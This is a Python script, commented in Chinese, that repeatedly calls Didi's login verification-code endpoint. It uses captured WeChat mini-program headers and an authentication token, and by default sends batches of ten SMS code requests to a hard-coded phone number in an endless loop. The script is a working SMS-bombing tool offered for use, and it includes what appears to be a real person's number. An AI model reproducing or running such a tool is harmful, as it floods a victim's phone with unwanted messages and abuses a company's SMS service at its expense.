import requests
import json
import time

def send_code(phone_number, index):
    url = 'https://epassport.diditaxi.com.cn/passport/login/v5/codeMT'
    headers = {
        'Host': 'epassport.diditaxi.com.cn',
        'Connection': 'keep-alive',
        'MpLogin-Ver': '5.5.1',
        'content-type': 'application/x-www-form-urlencoded',
        'secdd-authentication': '49afb436f1b4de01ccd95876718546a2ee095f5762fd80e5b45c6017a80b6d73e09ebd0ba9c3ef1cd29888d9ca528e19bf0e73cf94010000001000000',
        'secdd-challenge': '3|2.0.11||||||',
        'Accept-Encoding': 'gzip,compress,br,deflate',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.56(0x1800382d) NetType/WIFI Language/zh_CN',
        'Referer': 'https://servicewechat.com/wx9e9b87595c41dbb7/491/page-frame.html'
    }
    
    data = {
        'q': json.dumps({
            "api_version": "1.0.1",
            "appid": 35011,
            "role": 1,
            "device_name": "iPhone XS Max China-exclusive-iPhone11,6>",
            "sec_session_id": "",
            "cell": phone_number
        }),
        "policy_id_list": ["50008256"],
        "policy_name_list": ["ddfp:"],
        "lang": "zh-CN",
        "wsgenv": "",
        "cell": phone_number
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        if response.status_code == 200:
            print(f"    ✅ 第 {index} 条发送成功")
            return True
        else:
            print(f"    ❌ 第 {index} 条发送失败")
            return False
    except Exception as e:
        print(f"    ❌ 第 {index} 条异常")
        return False

def send_batch(phone, batch_num):
    """发送一批10条"""
    print(f"\n  📦 第 {batch_num} 批开始")
    success = 0
    fail = 0
    
    for i in range(1, 11):  # 10条
        if send_code(phone, i):
            success += 1
        else:
            fail += 1
    
    print(f"  📊 第 {batch_num} 批: 成功{success} | 失败{fail}")
    return success, fail

if __name__ == "__main__":
    # ========== 配置 ==========
    phone = "17751377766"      # 手机号
    repeat_times = 0           # 重复执行次数，0=无限循环
    wait_seconds = 1           # 每批之间等待1秒
    # =========================
    
    print("=" * 50)
    print("滴滴验证码批量发送（循环模式）")
    print("=" * 50)
    print(f"手机号: {phone}")
    print(f"每批发送: 10条")
    print(f"批间隔: {wait_seconds}秒")
    print(f"重复次数: {'无限' if repeat_times == 0 else repeat_times}次")
    print("=" * 50)
    
    total_success = 0
    total_fail = 0
    batch_count = 0
    
    try:
        while True:
            batch_count += 1
            
            # 发送一批10条
            success, fail = send_batch(phone, batch_count)
            total_success += success
            total_fail += fail
            
            print(f"\n📊 累计: 成功{total_success} | 失败{total_fail} | 共{batch_count}批")
            
            # 检查是否达到重复次数
            if repeat_times > 0 and batch_count >= repeat_times:
                print(f"\n✅ 已完成 {repeat_times} 次，程序结束")
                break
            
            # 等待1秒后继续
            print(f"\n⏳ 等待 {wait_seconds} 秒后开始下一批...")
            time.sleep(wait_seconds)
            
    except KeyboardInterrupt:
        print(f"\n\n⚠️ 用户手动停止")
        print(f"📊 最终统计: 成功{total_success} | 失败{total_fail} | 共{batch_count}批")